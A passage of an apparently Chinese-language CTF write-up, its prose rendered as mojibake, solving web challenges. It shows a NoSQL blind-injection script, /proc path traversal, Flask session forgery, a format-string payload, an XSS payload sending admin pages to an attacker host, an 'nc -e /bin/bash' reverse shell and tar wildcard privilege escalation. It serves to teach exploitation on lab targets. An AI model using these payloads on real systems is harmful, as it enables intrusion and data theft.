class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//è®¾ç½®stub, å¢åŠ gifæ–‡ä»¶å¤´ï¼Œä¼ªé€ æ–‡ä»¶ç±»å‹</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h3><p>æ‰«æå‘ç°<code>info.php</code>å‘ç°æ˜¯ä½¿ç”¨<code>mangodb</code>ï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯<code>Nosqlæ³¨å…¥</code></p><p>è‡ªåŠ¨è¯†åˆ«éªŒè¯ç +ç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvcode</span><span class="params">()</span>:</span></span><br><span class="line">url1 = <span class="string">'http://123.206.213.66:45678/vertify.php'</span></span><br><span class="line">pic = s.get(url1)</span><br><span class="line">p = open(<span class="string">'123.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p.write(pic.content)</span><br><span class="line">p.close()</span><br><span class="line">im = Image.open(<span class="string">'123.png'</span>)</span><br><span class="line">vcode = pytesseract.image_to_string(im)</span><br><span class="line"><span class="keyword">return</span> vcode</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">'http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^&#123;&#125;&amp;vertify=&#123;&#125;'</span></span><br><span class="line">pwd = <span class="string">''</span></span><br><span class="line"><span class="comment"># 'username or password incorrect!'</span></span><br><span class="line"><span class="comment"># 'wrong CAPTCHA!'</span></span><br><span class="line"><span class="comment"># 'Nice!But it is not the real passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.lowercase:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">vcode = getvcode()</span><br><span class="line">check = s.get(url2.format(pwd+x,vcode))</span><br><span class="line"><span class="keyword">print</span> check.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'wrong CAPTCHA!'</span> <span class="keyword">in</span> check.content:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'Nice!'</span> <span class="keyword">in</span> check.content:</span><br><span class="line">pwd += x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> pwd</span><br></pre></td></tr></table></figure><h3 id="çš‡å®¶çº¿ä¸ŠèµŒåœº"><a href="#çš‡å®¶çº¿ä¸ŠèµŒåœº" class="headerlink" title="çš‡å®¶çº¿ä¸ŠèµŒåœº"></a>çš‡å®¶çº¿ä¸ŠèµŒåœº</h3><p>æ‰“å¼€é¡µé¢å‘ç°äº†å¼¹çª—ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶åŒ…å«<code>&lt;script src=&quot;/static?file=test.js&quot;&gt;&lt;/script&gt;</code></p><p>æµ‹è¯•å‘ç°å¯ä»¥æˆåŠŸè¯»å–<code>http://107.167.188.241/static?file=/etc/passwd</code>ï¼Œé¢˜ç›®æç¤ºæ˜¯python3.5å†™çš„ï¼Œéœ€è¦æ‰¾åˆ°webç›®å½•ã€‚</p><p><code>view-source:http://107.167.188.241/source</code>å‘ç°äº†ç›®å½•ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]<span class="comment"># tree web</span></span><br><span class="line">web/</span><br><span class="line">â”œâ”€â”€ app</span><br><span class="line">â”‚   â”œâ”€â”€ forms.py</span><br><span class="line">â”‚   â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚   â”œâ”€â”€ models.py</span><br><span class="line">â”‚   â”œâ”€â”€ static</span><br><span class="line">â”‚   â”œâ”€â”€ templates</span><br><span class="line">â”‚   â”œâ”€â”€ utils.py</span><br><span class="line">â”‚   â””â”€â”€ views.py</span><br><span class="line">â”œâ”€â”€ req.txt</span><br><span class="line">â”œâ”€â”€ run.py</span><br><span class="line">â”œâ”€â”€ server.log</span><br><span class="line">â”œâ”€â”€ start.sh</span><br><span class="line">â””â”€â”€ uwsgi.ini</span><br><span class="line">[root@localhost]<span class="comment"># cat views.py.bak</span></span><br><span class="line">filename = request.args.get(<span class="string">'file'</span>, <span class="string">'test.js'</span>)</span><br><span class="line"><span class="keyword">if</span> filename.find(<span class="string">'..'</span>) != -1:</span><br><span class="line">    <span class="built_in">return</span> abort(403)</span><br><span class="line">filename = os.path.join(<span class="string">'app/static'</span>, filename)</span><br></pre></td></tr></table></figure><p>/proc/self/cmdline å¯ä»¥çœ‹åˆ°å¯åŠ¨å‘½ä»¤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --uid=ctf uwsgi.ini</span><br></pre></td></tr></table></figure></p><p>/proc/mounts æˆ–è€… /proc/self/maps å¯ä»¥çœ‹åˆ°å·¥ä½œç›®å½•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ctf/web_assli3fasdf</span><br></pre></td></tr></table></figure></p><p>ç”±äºç¨‹åºä»£ç è¿‡æ»¤<code>&lt;pre&gt; if filename != &#39;/home/ctf/web/app/static/test.js&#39; and filename.find(&#39;/home/ctf/web/app&#39;) != -1: return abort(404) &lt;/pre&gt;</code>ï¼Œä¸èƒ½ç›´æ¥è¯»ï¼Œä¸è¿‡ç”¨å¯ä»¥é€šè¿‡<code>/proc/self/cwd</code>ç»•è¿‡ã€‚</p><blockquote><p>ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¿›ç¨‹å½“å‰çš„å·¥ä½œç›®å½•. ä¾‹å¦‚, è¦æ‰¾å‡ºè¿›ç¨‹ 20 çš„ cwd, å¯ä»¥:<code>cd /proc/20/cwd; /bin/pwd</code></p></blockquote><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/views.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/views.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_views</span><span class="params">(app)</span>:</span></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_account</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.path == <span class="string">'/signup'</span> <span class="keyword">or</span> request.path == <span class="string">'/login'</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        uname = username=session.get(<span class="string">'username'</span>)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        <span class="keyword">if</span> u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = <span class="string">'swpuctf&#123;xxxxxxxxxxxxxx&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> uname == <span class="string">'admin'</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            now = int(time())</span><br><span class="line">            <span class="keyword">if</span> (now - u.ts &gt;= <span class="number">600</span>):</span><br><span class="line">                u.balance = <span class="number">10000</span></span><br><span class="line">                u.count = <span class="number">0</span></span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[<span class="string">'balance'</span>] = <span class="number">10000</span></span><br><span class="line">                session[<span class="string">'count'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">    @login_required</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">        u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">        field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">        mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">        <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> register_views</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">()</span>:</span></span><br><span class="line">    app = Flask(__name__, static_folder=<span class="string">''</span>)</span><br><span class="line">    app.secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line">    app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:////tmp/test.db'</span></span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>æœ‰äº†<code>secret_key</code>ï¼Œé¦–å…ˆæƒ³åˆ°æ˜¯ä¼ªé€ adminçš„session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X:\tmp</span><br><span class="line">&gt; py -3 session_cookie_manager.py decode -s <span class="string">"9f516783b42730b7888008dd5c15fe66"</span> -c <span class="string">".eJwVzEEKgDAMBdG7_LVIKtpKLyNpmoCoFaquxLurs3qruZF45SKK6OirpQayX-VE_HVUm8590YKIToN3nklzkkTkLAw0ZjHz1MsYNJEO1mWPBtehtfD2TbHMlfG8O_kfGQ.XBscbw.pI4VrBhi7bb3o_V2_spFrWgysI0"</span></span><br><span class="line">&#123;<span class="string">'balance'</span>: 10000.0, <span class="string">'count'</span>: 0, <span class="string">'csrf_token'</span>: <span class="string">'2e7616a0edbcb001f7508dcff604c87eb0e5f2d6'</span>, <span class="string">'username'</span>: <span class="string">'kira'</span>&#125;</span><br><span class="line"></span><br><span class="line">X:\tmp</span><br><span class="line">&gt; py -3 session_cookie_manager.py encode -s <span class="string">"9f516783b42730b7888008dd5c15fe66"</span> -t <span class="string">"&#123;'balance': 1000000.0, 'count': 1000000.0, 'csrf_token': '2e7616a0edbcb001f7508dcff604c87eb0e5f2d6', 'username': 'admin'&#125;"</span></span><br><span class="line">.eJxVzDsKw0AMRdG9vHoIGpP54M0EjUaC4FgGf6qQvdu4yy1Pcb9o_GEXxRjp7kEBshy-_8u22mtfJnWMGLTkmJm0N2lE0Uqi2sUs01Nq0UaabOgZAcemq_N87cF9fjt-J0JqIVo.XBsiEA.6lDWb7AENFiwelgWZW3hxz4SoFw</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¾—åˆ°adminçš„sessionåï¼Œå¯ä»¥è¿›å…¥<code>getflag()</code>ï¼Œç•™æ„è¿™é‡Œæœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼Œå¦‚ä½•æ„é€ pythonç»§æ‰¿é“¾å»è¯»å–<code>g.flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getflag', methods=('POST',))</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    u = getattr(g, <span class="string">'u'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> u <span class="keyword">or</span> u.balance &lt; <span class="number">1000000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;"s": -1, "msg": "error"&#125;'</span></span><br><span class="line">    field = request.form.get(<span class="string">'field'</span>, <span class="string">'username'</span>)</span><br><span class="line">    mhash = hashlib.sha256((<span class="string">'swpu++&#123;0.'</span> + field + <span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    jdata = <span class="string">'&#123;&#123;"&#123;0&#125;":'</span> + <span class="string">'"&#123;1.'</span> + field + <span class="string">'&#125;", "hash": "&#123;2&#125;"&#125;&#125;'</span></span><br><span class="line">    <span class="keyword">return</span> jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºï¼Œuseræœ‰saveæ–¹æ³•ï¼Œä¸€æ­¥ä¸€æ­¥å¾€ä¸‹æ‰¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;__class__.save&quot;:&quot;&lt;function User.save at 0x7f1b740ee048&gt;&quot;</span><br><span class="line">&quot;__class__.save.__globals__&quot;:&quot;&#123;..., &apos;db&apos;: &lt;SQLAlchemy engine=sqlite:////tmp/test.db&gt;, ...&quot;</span><br><span class="line">&quot;__class__.save.__globals__[db]&quot;:&quot;&lt;SQLAlchemy engine=sqlite:////tmp/test.db&gt;&quot;</span><br><span class="line">&quot;__class__.save.__globals__[db].__class__.__init__.__globals__&quot;:&quot;&#123;..., &apos;current_app&apos;: &lt;Flask &apos;app&apos;&gt;, ...&#125;&quot;</span><br></pre></td></tr></table></figure><p>ç•™æ„åˆ°æœ‰ä¿®é¥°å™¨<code>@app.before_request</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__&quot;:&quot;&#123;..., &apos;g&apos;: &lt;flask.g of &apos;app&apos;&gt;, ...&#125;&quot;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag&quot;:&quot;swpuctf&#123;tHl$_15_4_f14G&#125;&quot;, &quot;hash&quot;: &quot;8bce7edc292f3211b97bc0a981c87135f0329681468bb6a3b487aaa23d8473fd&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ‰è¶£çš„é‚®ç®±"><a href="#æœ‰è¶£çš„é‚®ç®±" class="headerlink" title="æœ‰è¶£çš„é‚®ç®±"></a>æœ‰è¶£çš„é‚®ç®±</h3><p>åœ¨éªŒè¯é‚®ç®±çš„é¡µé¢æºç æœ‰æç¤ºï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªåå°ç®¡ç†çš„é¡µé¢ï¼Œä¸è¿‡åªå…è®¸<code>localhost</code>è®¿é—®ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾å°±æ˜¯é€šè¿‡xssè®¿é—®ç®¡ç†å‘˜çš„é¡µé¢äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'email'</span>]) &#123;</span><br><span class="line">$email = $_POST[<span class="string">'email'</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error email, please check your email"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ç­‰å¾…ç®¡ç†å‘˜è‡ªåŠ¨å®¡æ ¸"</span>;</span><br><span class="line"><span class="keyword">echo</span> $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦ç»•è¿‡é‚®ç®±çš„è¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥ç”¨<code>&quot;&lt;script/src=//x.x.x.x/123.js&gt;&lt;/script&gt;&quot;@qq.com</code>ç»•è¿‡</p><p>å…ˆæ‰“ä¸€å‘adminçš„cookieï¼š<code>email=&quot;&lt;script/src=//x.x.x.x:50004&gt;&lt;/script&gt;&quot;@qq.com</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://localhost:6324/admin/admin.php</span><br><span class="line">User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Host: x.x.x.x:50004</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure><p>ç„¶è€Œå¹¶æ²¡æœ‰cookieï¼Œä¸è¿‡å‘ç°adminçš„é¡µé¢é“¾æ¥ï¼Œå°è¯•è¯»ä¸€ä¸‹<code>admin.php</code>çš„é¡µé¢æºç ï¼Œç”¨<code>xssrf-leak</code>çš„è„šæœ¬ä¹Ÿå¯ä»¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">'GET'</span>, <span class="string">'http://localhost:6324/admin/admin.php'</span>, <span class="literal">false</span>);</span><br><span class="line">a.send(<span class="literal">null</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">'http://x.x.x.x:50004/?f='</span> + <span class="built_in">escape</span>(b);</span><br></pre></td></tr></table></figure><p><code>email=&quot;&lt;script/src=//x.x.x.x:50005/evil&gt;&lt;/script&gt;&quot;@qq.com</code></p><p>è¿”å›ç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªå¯ä»¥å‘½ä»¤æ‰§è¡Œçš„é“¾æ¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">118.89.56.208 - - [20/Dec/2018 16:50:22] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">&#123;&apos;f&apos;: u&apos;&lt;br /&gt;&lt;a href=&quot;admin/a0a.php?cmd=whoami&quot;&gt;&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>åå¼¹shellè¿›è¡Œæ“ä½œæ–¹ä¾¿ç‚¹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">'GET'</span>, <span class="string">'http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+x.x.x.x+20007'</span>, <span class="literal">false</span>);</span><br><span class="line">a.send(<span class="literal">null</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">'http://x.x.x.x:50004/?f='</span> + <span class="built_in">escape</span>(b);</span><br></pre></td></tr></table></figure><p>åœ¨æ ¹ç›®å½•å‘ç°flagï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@VM-<span class="number">48</span>-<span class="number">87</span>-debian:/$ ls -al</span><br><span class="line">-r--------  <span class="number">1</span> flag flag    <span class="number">36</span> Dec <span class="number">18</span> <span class="number">18</span>:<span class="number">14</span> flag</span><br></pre></td></tr></table></figure><p>åœ¨webç›®å½•å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„æ–‡ä»¶å¤¹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@VM-<span class="number">48</span>-<span class="number">87</span>-debian:~/html/<span class="number">4</span>f0a5ead5aef34138fcbf8cf00029e7b$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">72</span></span><br><span class="line">drwxr-xr-x <span class="number">6</span> root root   <span class="number">4096</span> Dec <span class="number">19</span> <span class="number">19</span>:<span class="number">03</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root root   <span class="number">4096</span> Dec <span class="number">20</span> <span class="number">10</span>:<span class="number">07</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root    <span class="number">320</span> Dec <span class="number">18</span> <span class="number">17</span>:<span class="number">14</span> backup.php</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> css</span><br><span class="line">drwxr-x--- <span class="number">5</span> flag nginx <span class="number">36864</span> Dec <span class="number">20</span> <span class="number">19</span>:<span class="number">59</span> files</span><br><span class="line">drw-r--r-- <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> fonts</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root   <span class="number">4714</span> Dec <span class="number">16</span> <span class="number">20</span>:<span class="number">17</span> index.html</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root   <span class="number">4096</span> Dec <span class="number">13</span> <span class="number">19</span>:<span class="number">25</span> js</span><br><span class="line">-rw------- <span class="number">1</span> root root      <span class="number">0</span> Dec <span class="number">19</span> <span class="number">19</span>:<span class="number">03</span> nohup.out</span><br><span class="line">-r--r----- <span class="number">1</span> flag flag    <span class="number">707</span> Dec <span class="number">18</span> <span class="number">17</span>:<span class="number">13</span> upload.php</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>backup.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"upload.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ä¸Šä¼ ç›®å½•ï¼š"</span> . $upload_dir . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">$sys = <span class="string">"tar -czf z.tar.gz *"</span>;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'z.tar.gz'</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä¸Šä¼ ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤‡ä»½æˆåŠŸ!&lt;br /&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å¤‡ä»½æ–‡ä»¶å: z.tar.gz"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æœªä¸Šä¼ æ–‡ä»¶ï¼Œæ— æ³•å¤‡ä»½ï¼"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">åˆ©ç”¨é€šé…ç¬¦è¿›è¡ŒLinuxæœ¬åœ°ææƒ</a></p><p>æ ¹æ®æ–‡ç« çš„æ“ä½œæ–¹æ³•ï¼Œåˆ©ç”¨ä¸Šä¼ åˆ†åˆ«ä¸Šä¼ 3ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--checkpoint=1</span><br><span class="line">--checkpoint-action=exec=sh exp.sh</span><br><span class="line">exp.sh  #å†…å®¹æ”¾éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ cat /flag</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ å®Œæ¯•åè¿›è¡Œä¸€æ¬¡å¤‡ä»½å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit_1"></a>exploit_1</h3><p>çœ‹å®Œä¼ªä»£ç 